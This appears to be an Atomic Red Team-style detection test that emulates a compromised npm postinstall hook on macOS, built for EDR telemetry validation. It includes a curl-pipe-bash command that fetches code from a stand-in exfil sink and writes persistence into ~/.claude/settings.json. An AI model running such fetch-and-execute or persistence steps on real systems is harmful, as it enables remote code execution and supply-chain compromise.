@@ -1,0 +1,61 @@
+attack_technique: T1195.002
+display_name: Compromised Software Dependencies
+atomic_tests:
+  - name: npm Postinstall Hook Persistence (2026 macOS)
+    description: |
+      Simulates a compromised npm package's postinstall hook that establishes
+      persistence by creating ~/.claude/settings.json. The hook uses a small
+      compiled `node` stub: with -c it runs its argument via system(), so /bin/sh and
+      curl appear as children of a process named node; with -e it does what the
+      one-line script would (writeFileSync(argv[1], argv[2])), so node itself creates
+      the settings file.
+
+      Fidelity limits:
+      - /tmp/cs_node/node is a cc-compiled stub (ad-hoc, linker-signed), not real Node.js.
+        A renamed copy of /bin/sh is killed by AMFI launch constraints (macOS 13+).
+      - Download goes to exfil sink URL (GET denied from VPC, pipe runs nothing)
+      - The -e script is not run: the stub writes its two arguments the way the script would
+      - Creates ~/.claude/settings.json as benign persistence (a real one is moved aside first,
+        so the write is a create event, and moved back in cleanup)
+
+      Expected telemetry: cc/ld execs creating /tmp/cs_node/node, exec of that node
+      stub, /bin/sh -c child, curl exec, create of ~/.claude/settings.json by the node stub.
+
+      Falcon block status: not blocked (2026-11-12 14:50Z run; macOS 26.7, Falcon 8.10)
+
+      Prerequisite: Xcode Command Line Tools (`cc`). The Amazon macOS AMI has them; MacStadium images don't.
+    supported_platforms:
+      - macos
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        set -e
+        xcode-select -p >/dev/null 2>&1 || { echo "prereq missing: Xcode Command Line Tools (cc)"; exit 1; }
+        mkdir -p /tmp/cs_node
+        mkdir -p ~/.claude || true
+        # Move a real file aside, once (never our own simulated file), so node's write is a create, not a rewrite.
+        if [ -f ~/.claude/settings.json ]; then
+          if grep -q '"sim_test"' ~/.claude/settings.json; then rm -f ~/.claude/settings.json
+          elif [ ! -f ~/.claude/settings.json.cs_backup ]; then mv ~/.claude/settings.json ~/.claude/settings.json.cs_backup
+          else echo "a real ~/.claude/settings.json and a backup both exist; not touching them"; exit 1; fi
+        fi
+        # A renamed copy of /bin/sh is killed by AMFI launch constraints, so build a tiny non-Apple 'node':
+        # -c runs its argument via system() (node -> /bin/sh -c -> children, like a postinstall hook);
+        # -e does what `node -e "require('fs').writeFileSync(process.argv[1], process.argv[2])" FILE TEXT` does.
+        printf '%s\n' '#include <stdio.h>' '#include <stdlib.h>' '#include <string.h>' 'int main(int c, char **v) {' '  if (c > 2 && !strcmp(v[1], "-c")) return system(v[2]);' '  if (c > 4 && !strcmp(v[1], "-e")) { FILE *f = fopen(v[3], "w"); if (!f) return 1; fputs(v[4], f); return fclose(f) != 0; }' '  return 0;' '}' > /tmp/cs_node/node.c
+        cc -o /tmp/cs_node/node /tmp/cs_node/node.c
+        /tmp/cs_node/node -c 'curl -s https://exfil-sink.nebulock.internal/config | bash || true; mkdir -p ~/.claude'
+        /tmp/cs_node/node -e "require('fs').writeFileSync(process.argv[1], process.argv[2])" ~/.claude/settings.json "{\"sim_test\": \"coresigma_npm_persistence\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
+        if [ ! -f ~/.claude/settings.json ]; then exit 1; fi
+        echo "npm postinstall persistence chain complete"
+      cleanup_command: |
+        set -e
+        rm -rf /tmp/cs_node
+        if [ -f ~/.claude/settings.json.cs_backup ]; then
+          mv ~/.claude/settings.json.cs_backup ~/.claude/settings.json
+        elif grep -q '"sim_test"' ~/.claude/settings.json 2>/dev/null; then
+          rm -f ~/.claude/settings.json
+        fi
+        rmdir ~/.claude 2>/dev/null || true
+        echo "Cleanup complete"
